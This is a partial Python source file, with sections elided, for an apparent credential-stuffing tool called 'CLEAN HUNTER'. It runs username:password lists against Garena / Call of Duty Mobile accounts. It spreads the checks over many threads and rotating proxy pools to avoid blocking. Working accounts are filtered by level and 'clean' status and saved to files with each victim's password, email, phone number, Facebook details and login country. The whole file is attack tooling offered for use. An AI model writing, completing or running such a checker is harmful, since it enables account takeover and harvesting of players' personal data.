        return

    if not accounts:
        console.print(indent + "  [red]No valid accounts found.[/red]")
        return
    ...
    console.print(Panel(
        "[bold white]Check OTHER GAMES[/bold white] (AOV / ROV / Delta Force / Free Fire / etc.)\n\n"
        "[dim]Scan each clean+CODM hit for all Garena game connections\n"
        "and include them in the output file.\n"
        "[yellow]⚠  Adds ~1-3s per hit — only fires on clean+CODM accounts.[/yellow][/dim]",
        title="[bold bright_magenta]GAME CONNECTIONS[/bold bright_magenta]",
        border_style="bright_magenta", padding=(0, 2)
    ))
    og_raw = console.input("  [bold bright_magenta]> Check other games? (y/N): [/bold bright_magenta]").strip().lower()
    CHECK_OTHER_GAMES = og_raw == "y"
    console.print("  [bright_magenta]✔ Will scan game connections on hits[/bright_magenta]\n" if CHECK_OTHER_GAMES else "  [dim]CODM only[/dim]\n")

    console.print(Panel(
        "[dim]Minimum CODM level to save — accounts below this level are skipped.\n"
        "Enter 0 or leave blank to save all levels.[/dim]",
        title="[bold cyan]LEVEL FILTER[/bold cyan]", border_style="cyan", padding=(0, 2)
    ))
    while True:
        try:
            raw_lvl = console.input("  [bold bright_cyan]> Min level (Enter = 0): [/bold bright_cyan]").strip()
            min_level = int(raw_lvl) if raw_lvl else 0
            break
        except ValueError:
            console.print("  [red]Enter a number.[/red]")

    if min_level > 0:
        console.print(f"  [green]Only saving level {min_level}+ accounts[/green]\n")
    else:
        console.print("  [dim]Saving all levels[/dim]\n")
    ...
    while True:
        try:
            raw_t = console.input(indent + f"  [bold bright_cyan]> Threads 1-50 (default {DEFAULT_THREADS}): [/bold bright_cyan]").strip()
            num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
            if 1 <= num_threads <= 50:
                break
            console.print("  [red]Enter 1-50.[/red]")
    ...
    def _print_hit(account, password, lvl, region, ign, is_clean_codm, game_connections=None, details=None):
        ...
        if is_clean_codm:
            ...
            progress_bar.print(Panel(
                _tbl,
                title=f"[bold bright_green]CLEAN[/bold bright_green]  {_cred}",
                border_style="bright_green",
                padding=(0, 1),
            ))
        else:
            if others:
                label    = "[bold bright_green][CLEAN][/bold bright_green]"
            ...
            progress_bar.print(
                f"  {label}"
                f" [white]{acc_short}[/white][dim]:{masked}[/dim]"
                f" [dim]noCODM[/dim]{game_str}"
            )
    ...
    def _format_hit_file(account, password, lvl, region, ign, uid, details, game_connections):
        ...
        lines = [
            ...
            f"UID            : {uid}",
            f"Username       : {username}",
            f"Garena Shell   : {shell}",
            f"Email          : {email_display}",
            f"Mobile         : {formatted_mobile}",
            f"Country        : {country}",
            f"Nickname       : {nickname}",
            f"Bind Status    : {bind_status}",
            f"Binds          : {', '.join(binds) if binds else 'None'}",
            "",
            "--- Facebook Information ---",
            f"Facebook Username : {fb_username}",
            f"Facebook UID      : {fb_uid}",
            f"Facebook Link     : {fb_link}",
            f"Facebook Status   : {fb_info}",
            "",
            "--- CODM Information ---",
            f"Account Level  : {lvl}",
            f"Server         : {region}",
            ...
            f"Last Login Country : {last_login_country}",
            "",
            f"Account Status : CLEAN",
        ]
    ...
    def _format_clean_no_codm_file(account, password, details, game_connections=None):
        ...
        lines = [
            ...
            f"Last Login Country : {last_login_country}",
            "",
            f"Account Status : CLEAN — No CODM",
        ]
    ...
    def _print_live_ch():
        ...
        desc = (
            ...
            f" [bright_green]+CODM:{cc2}[/bright_green]"
            f" [green]CLEAN:{co2}[/green]"
            f" [dim]Err:{er2} {rate2:.1f}/s{hi_str}[/dim]"
        )
        progress_bar.update(task, description=desc)

    progress_bar = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(complete_style="bright_green", finished_style="bright_green", bar_width=20),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("[cyan]{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        console=console,
    ...
    try:
        with progress_bar:
            task = progress_bar.add_task(
                f"[bright_green]◆[/bright_green] +CODM:0 CLEAN:0 Err:0 0.0/s",
                total=total,
            )
            ...
            futs = {ex.submit(_wrapped, ap): ap for ap in accounts}
            try:
                for fut in as_completed(futs):
                    if stop_ev.is_set():
                        break
    ...
    t1 = Table(show_header=True, box=None, padding=(0, 2))
    t1.add_column("Category",  style="bold cyan",         min_width=18, no_wrap=True)
    t1.add_column("Count",     justify="right", style="bold bright_white", min_width=7)
    t1.add_column("Pct",       justify="right", style="bold yellow",       min_width=7)
    t1.add_column("Visual",    min_width=24)
    for label, cnt, col in [
        ("Clean + CODM",    cc, "bright_green"),
        ("Clean (no CODM)", co, "green"),
        ("Not Clean",       nc, "yellow"),
        ("Skipped (level)", sl, "dim"),
        ("Errors",          er, "red"),
    ]:
        pct_s = f"{cnt / total * 100:.1f}%" if total else "0.0%"
        t1.add_row(label, str(cnt), pct_s, _bar(cnt, total, col))
    ...
    t2 = Table(show_header=False, box=None, padding=(0, 2))
    t2.add_column(style="bold cyan",         min_width=20, no_wrap=True)
    t2.add_column(style="bold bright_white", min_width=18, no_wrap=True)
    ...
    if hl > 0:
        t2.add_row("Highest Clean",  f"[bold bright_cyan]Lv.{hl}  {hi}  {hr}[/bold bright_cyan]")
        t2.add_row("Account",        f"[dim]{ha}[/dim]")
    t2.add_row("Clean+CODM file",  f"[cyan]clean_with_codm.txt[/cyan]")
    t2.add_row("Sorted by level",  f"[cyan]clean_with_codm_sorted.txt[/cyan]")
    t2.add_row("Clean only file",  f"[cyan]clean_no_codm.txt[/cyan]")
    t2.add_row("Summary",         f"[cyan]summary.txt[/cyan]")

    console.print("\n")
    console.print(Panel(
        Group(t1, t2),
        title="[bold bright_green]◆ CLEAN HUNTER — FINAL RESULTS[/bold bright_green]",
...
def display_main_menu():
    console.print(Panel(
        ...
        title="[bold cyan]MENU[/bold cyan]", border_style="cyan", padding=(0, 2)
    ))
    while True:
        try:
            ...
            if choice in ("1", "2", "3", "4", "5"):
                return choice
            console.print("  [red]Enter 1, 2, 3, 4, or 5.[/red]")
        except KeyboardInterrupt:
            return "3"

def single_check():
    """Single account check functionality with elegant formatting"""
    clear_screen()
    display_banner()

    indent = "    "

    console.print(Panel("[dim]Enter credentials to check a single account.[/dim]",
        title="[bold bright_magenta]SINGLE CHECK[/bold bright_magenta]", border_style="bright_magenta", padding=(0,2)))
    console.print("")
    ...
    while True:
        ...
        account = console.input("  [bold bright_cyan]> Username/Email: [/bold bright_cyan]").strip()
        if not account:
            console.print("  [red]Cannot be empty.[/red]\n")
            continue

        password = console.input("  [bold bright_cyan]> Password: [/bold bright_cyan]").strip()
        if not password:
            console.print("  [red]Cannot be empty.[/red]\n")
            continue
        ...
        results_manager.base_dir.mkdir(parents=True, exist_ok=True)
        (results_manager.base_dir / "Country").mkdir(exist_ok=True)
        (results_manager.base_dir / "Level").mkdir(exist_ok=True)
        ...
        processaccount(
            ...
            live_stats, results_manager,
            file_manager=None, combo_file_path=None, auto_remove=False,
            use_elegant_display=True
        )

        save_response = console.input("\n  [bold bright_yellow]> Save result? (y/n): [/bold bright_yellow]").strip().lower()
        if save_response == 'y':
            console.print(f"  [green]Saved to '{results_manager.base_dir}'[/green]")
        else:
            ...
            try:
                ...
                console.print("  [red]Error cleaning up.[/red]")

        continue_response = console.input("\n  [bold bright_magenta]> Check another? (y/n): [/bold bright_magenta]").strip().lower()
        ...
        session.close()
        console.print("\n" + indent + "[bold cyan]🔄 Refreshing session for next check...[/bold cyan]")
        time.sleep(1)
        console.print("\n" + indent + "─" * 71 + "\n")
        clear_screen()
        display_banner()
        console.print("\n" + indent + "╔═══════════════════════════════════════════════════════════════════╗", style="bold bright_magenta")
        console.print(indent + "║                      SINGLE ACCOUNT CHECK                         ║", style="bold bright_white")
        console.print(indent + "╚═══════════════════════════════════════════════════════════════════╝", style="bold bright_magenta")
        console.print("")

def _parse_proxy_line(raw: str) -> str | None:
    """
    Accept any common proxy format and return a normalised URL string.
    Returns None if the line cannot be parsed as a proxy.
    """
    raw = raw.strip()
...
def _get_check_session() -> requests.Session:
    """Return a per-thread Session with a tight adapter pool."""
...
def _validate_proxy(url: str, timeout: float = 5.0) -> tuple[bool, str, float]:
    """
    Test a single proxy URL as fast as possible.
    Returns (True, detected_ip, latency_ms) or (False, error_reason, -1.0).

    WHY RAW SOCKET:
    requests/urllib3 have multiple encoding layers between a proxy URL and
    the final Proxy-Authorization header.  Passwords containing special
    characters (+, @, :, etc.) can be silently corrupted at any layer,
    producing a false 407 even with correct credentials.

    This function uses a raw TCP socket + hand-crafted HTTP request so the
    password bytes are base64-encoded exactly once from the original string
    with no intermediate percent-encoding or decoding.
    """
    import base64
    import socket
    ...
    try:
        ...
        return False, f"parse_err({e})", -1.0
    ...
    if last_err not in ("auth_failed(407)", "auth_denied(403)", "auth_denied(401)",
                        "dns_fail", "connection_refused"):
        try:
            t0 = time.monotonic()
...
def _display_proxy_quality(
    ...
    """
    Evaluate proxy pool quality after validation and recommend a safe thread count.

    Quality tiers
    ─────────────
    HIGH   : success-rate ≥ 50 %  AND  avg latency ≤ 1 500 ms  →  up to 20 threads
    MEDIUM : success-rate ≥ 30 %  OR   avg latency ≤ 2 500 ms  →  8 – 12 threads
    LOW    : success-rate < 30 %  OR   avg latency > 2 500 ms  →  3 – 5 threads
    """
    if total_count == 0:
        return
    ...
    if success_rate >= 50 and 0 < avg_latency_ms <= 1500:
        ...
        tier_icon   = "🟢"
        rec_threads = "up to 20"
        rec_note    = "Maximum throughput — your proxies can handle it."
    elif success_rate >= 30 or (0 < avg_latency_ms <= 2500):
        tier        = "MEDIUM"
        tier_color  = "bold yellow"
        tier_icon   = "🟡"
        rec_threads = "8 – 12"
        rec_note    = "Balanced speed/accuracy — avoid pushing higher."
    else:
        tier        = "LOW"
        tier_color  = "bold red"
        tier_icon   = "🔴"
        rec_threads = "3 – 5"
        rec_note    = "Too many dead/slow proxies — fewer threads avoids false results."
    ...
    tbl.add_row("")
    tbl.add_row(f"🧵  Recommended Checker Threads :  [bold bright_cyan]{rec_threads}[/bold bright_cyan]")
    tbl.add_row(f"[dim]💬  {rec_note}[/dim]")

    from rich.panel import Panel as _Panel
    panel = _Panel(
        tbl,
        title="[bold bright_white] PROXY QUALITY REPORT [/bold bright_white]",
        border_style="cyan",
        padding=(0, 1),
        expand=False,
    )
...
def _validate_proxies_bulk(
    ...
    """
    Validate up to 14 000+ proxies as fast as possible.

    Strategy
    ─────────
    • Up to 500 concurrent worker threads (I/O-bound → threads beat processes)
    • Per-thread HTTP Session with adapter pool → avoids socket recreate cost
    • timeout = 5 s by default (dead proxies time out fast)
    • Single HTTP endpoint (no TLS), plain JSON – minimal round-trip
    • Live Rich progress bar with proxies/sec speed counter
    """
    total    = len(urls)
    ...
    console.print(
        indent
        + f"  [bold green]✔ Valid:  {len(valid):,}[/bold green]   "
        + f"[bold red]✖ Dead:  {len(invalid):,}[/bold red]   "
        + f"[dim]│  ~{avg_speed:.0f} proxies/s  │  {workers} threads  │  {timeout}s timeout[/dim]"
    )
...
def _hybrid_next() -> dict | None:
    """Round-robin through hybrid pool (proxies + direct slots). Thread-safe."""
...
def prompt_proxy_setup():
    ...
    console.print(Panel(
        "[bold white]  1[/bold white]  [dim]Proxy file      — load proxies.txt (or custom file)[/dim]\n"
        "[bold white]  2[/bold white]  [dim]Proxy URL       — paste single endpoint / rotating URL[/dim]\n"
        "[bold white]  3[/bold white]  [dim]No proxy        — direct connection only[/dim]\n"
        "[bold white]  4[/bold white]  [bold bright_magenta]Proxy + Direct  — alternate between proxies AND your real IP[/bold bright_magenta]",
        title="[bold cyan]PROXY SETUP[/bold cyan]", border_style="cyan", padding=(0, 2)
    ))
    ...
    if choice == "1":
        raw = console.input("  [bold bright_cyan]> Proxy filename (Enter for proxies.txt): [/bold bright_cyan]").strip()
        file_input = raw if raw else "proxies.txt"
        fpath = Path(os.path.join(os.path.dirname(os.path.abspath(__file__)), file_input))
        if not fpath.exists():
            ...
            if not parsed_urls:
                console.print("  [red]No valid proxies found in file.[/red]")
                proxy_manager = ProxyManager(enabled=False)
            else:
                console.print(f"  [green]Loaded {len(parsed_urls)} proxies from [cyan]{fpath.name}[/cyan][/green]")
                check_ans = console.input("  [bold bright_cyan]> Check proxies before starting? (y/N): [/bold bright_cyan]").strip().lower()
                if check_ans == "y":
                    console.print("")
                    parsed_urls = _validate_proxies_bulk(parsed_urls, indent="  ")
                    if not parsed_urls:
                        console.print("  [red]No working proxies after check — disabled.[/red]")
                        proxy_manager = ProxyManager(enabled=False)
                        console.print("")
                        return
                ...
                console.print(f"  [bright_green]✔ {len(parsed_urls)} proxies ready.[/bright_green]")

    elif choice == "2":
        url_input = console.input("  [bold bright_cyan]> Proxy URL: [/bold bright_cyan]").strip()
        if url_input:
            normalised = _parse_proxy_line(url_input)
            if not normalised:
                console.print("  [red]Could not parse proxy format — disabled.[/red]")
                proxy_manager = ProxyManager(enabled=False)
            else:
                console.print(f"  [green]Proxy URL set: [cyan]{normalised}[/cyan][/green]")
                check_ans = console.input("  [bold bright_cyan]> Check proxy before starting? (y/N): [/bold bright_cyan]").strip().lower()
                if check_ans == "y":
                    console.print("")
                    working = _validate_proxies_bulk([normalised], indent="  ")
                    if not working:
                        console.print("  [red]Proxy is dead — disabled.[/red]")
                        proxy_manager = ProxyManager(enabled=False)
                        console.print("")
                        return
                    console.print("  [bright_green]✔ Proxy is working.[/bright_green]")
        ...
        raw_direct = console.input(
            "  [bold bright_cyan]> Direct slots per proxy (Enter for 1): [/bold bright_cyan]"
        ).strip()
        try:
        ...
        if not parsed_urls:
            console.print("  [yellow]No proxies found — falling back to direct only.[/yellow]")
            proxy_manager = ProxyManager(enabled=False)
        else:
            console.print(f"  [green]Loaded {len(parsed_urls)} proxies.[/green]")
            check_ans = console.input("  [bold bright_cyan]> Check proxies before starting? (y/N): [/bold bright_cyan]").strip().lower()
            if check_ans == "y":
                console.print("")
                parsed_urls = _validate_proxies_bulk(parsed_urls, indent="  ")
            ...
            console.print(
                f"  [bold bright_magenta]Hybrid mode:[/bold bright_magenta] "
                f"[green]{len(parsed_urls)} proxies[/green] + "
                f"[cyan]{direct_slots} direct slot(s) each[/cyan]  "
                f"→ pool of [white]{len(_hybrid_pool)}[/white] connections, rotating infinitely"
            )

    else:
        proxy_manager = ProxyManager(enabled=False)
        console.print("  [dim]No proxy — direct connection.[/dim]")
...
if __name__ == "__main__":
    try:
        ...
        traceback.print_exc()
        logger.error(f"[ERROR] Unexpected error in main")